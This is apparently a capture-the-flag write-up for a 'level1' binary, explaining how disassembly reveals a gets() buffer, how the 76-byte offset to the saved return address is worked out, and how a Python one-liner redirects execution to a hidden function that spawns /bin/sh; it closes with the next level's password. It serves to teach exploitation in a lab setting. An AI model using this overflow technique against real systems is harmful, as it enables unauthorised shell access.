## level1
The binary for level1 takes in some input via stdin, and does nothing according to strace.

![image](https://hackmd.io/_uploads/rJwxIKjET.png)

This is also confirmed when the input is passed in and ran via GDB `run params < /tmp/test`.

![image](https://hackmd.io/_uploads/Bk9WdFsVp.png)

Which gives us a simple source 
```clike=
#include <stdio.h>
    
int main()
{
    char buff[0x50]; // ?
    
    // 0x8048490
    gets(buff);
}
```

There are still some unknowns, I still cant confirm the actual size of the buffer, or why does the ESP masks to 0xfffffff0 at the start (as seen in the above screenshot). Luckily, I found a way to disassemble the code without launching gdb everytime,  by using `objdump -M intel -d filename`.

![image](https://hackmd.io/_uploads/BJAH_a3ET.png)

Here, I can see an overview of the program which also includes a run function that executes fwrite and system *sus*, and a dummy frame.

According to this [blog](https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html), the `frame_dummy` is used for
> exception handling and reconstructing stack frames to aid debugging and stack forensics

The 0xfffffff0 masking for the ESP is used for alignment, as suggested in this [SO](https://stackoverflow.com/questions/37967710/why-is-esp-masked-with-0xfffffff0) for performance and compatibility purposes ([SSE compatibility](https://superuser.com/questions/137172/sse2-sse4-2-compatibility)).

And using the information above, we can determine the size of the buffer according to how the stack frame is formed.

![image](https://hackmd.io/_uploads/S10Us6hEp.png)

The **frame pointer** (ebp) is 4 bytes as well as the **return address**, and the **stack alignment** is 8 bytes. Hence the size of the buffer (assuming its the only local variable) will be the address of esp - ebp, and the length needed to overwrite the return address (eip) for a buffer overflow attack will be the size of the buffer + frame pointer + stack alignment.


lets look at the assmebly again ;
```
 8048486:       83 ec 50                sub    esp,0x50
 8048489:       8d 44 24 10             lea    eax,[esp+0x10]
 804848d:       89 04 24                mov    DWORD PTR [esp],eax
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 ```


from the snippet above, we can see that the stack allocated 0x50 bytes using the sub opcpde, however its not the case according to this [article](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html) where the system actually allocates to the nearest power of 2 for alignment. But at least we know our buffer size is less than 0x50 now.

In the next line, we can see that `lea    eax,[esp+0x10]` is loading the current esi address - 0x10 (stack grows downwards) to eax, to prepare the `gets` call. And according to gets manual, the argument accepts will be a buffer. Hence the size of the buffer can be deduced as `0x50 - 0x10` = 64 in decimal.

To overwrite the eip, we need to have at least 64 + 8 + 4 + 1 = 77 bytes of data.

` python -c "print('B' * 77)" > /tmp/test` to get the test input to overwrite eip.

![image](https://hackmd.io/_uploads/r1jnNAh46.png)

As we can see, the last two bytes of the saved eip is now 42. But what do we replace the saved EIP with? Remeber the run function earlier? The address is `0x8048444`. We can change our input file to `python -c "print('B' * 76 + '\x44\x84\x04\x08')" > /tmp/test` to test. (inverted address cuz little endian)

We're kinda there now, looks like we need to look at the `run` function to see what it does

![image](https://hackmd.io/_uploads/H17_UC24T.png)


![image](https://hackmd.io/_uploads/rkDtD0n4T.png)
For the arguments to fwrite, they are passing in `fwrite("Good... Wait what?", 0x1, 0x13, stdout)`.
for the args to system, they are `system("/bin/sh")`.

But why I dont get a shell? Prehaps its not execve? 
Upon looking at the man page, I see that
> system() executes a command specified in command by calling /bin/sh -c command

With that said, the source of the bianry should look like
```clike=
#include <stdio.h>
#include <stdlib.h>

# define MSG "Good... Wait what?"
# define SHELL "/bin/sh"
    
//0x8048444 
void run()
{
    // 0x804846d
    fwrite(MSG , 0x1, 0x13, stdout);
    
    // 0x8048479
    system(SHELL);
}
    
int main()
{
    // 0x8048486
    char buff[64];
    
    // 0x8048490
    gets(buff);
}
```

and according to the [SO](https://stackoverflow.com/questions/1697440/difference-between-system-and-exec-in-linux), system does not replace the current process. Which means I need to find a way to keep stdin open so that system can read input.

I tried this command
`(python -c "print('B' * 76 + '\x44\x84\x04\x08')" ; cat )| ./level1 ` and it worked.

![image](https://hackmd.io/_uploads/ByfgiCnNT.png)

The password for the next level is `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`